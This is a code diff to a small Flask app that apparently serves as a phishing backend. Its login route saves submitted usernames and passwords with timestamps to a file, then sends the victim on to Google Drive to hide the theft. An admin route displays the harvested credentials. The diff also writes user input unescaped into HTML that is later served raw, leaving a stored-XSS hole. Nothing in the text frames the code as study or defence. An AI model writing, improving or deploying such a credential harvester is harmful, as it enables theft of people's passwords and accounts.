@@ -1,4 +1,6 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, redirect
+import datetime
+
 app = Flask(__name__)
 
 @app.route("/")
@@ -9,10 +11,15 @@ def index():
 def login():
     username = request.form["username"]
     password = request.form["password"]
+    date = datetime.datetime.now()
     with open("data.txt", "a") as f:
-        f.write("Username: {} \nPassword: {}\n\n\n".format(username, password))
+        f.write("<p>Username: {} </p><p>\nPassword: {}</p><p>Date: {}</p>\n\n\n<br><br><br>".format(
+            username, 
+            password,
+            date
+        ))
         f.close()
-    return "ha"
+    return redirect('https://drive.google.com/', code=302)
 
 @app.route("/admin", methods=["POST", "GET"])
 def admin():
@@ -24,3 +31,4 @@ def admin():
                 text = f.read()
                 f.close()
                 return text
+        return 'bad login'
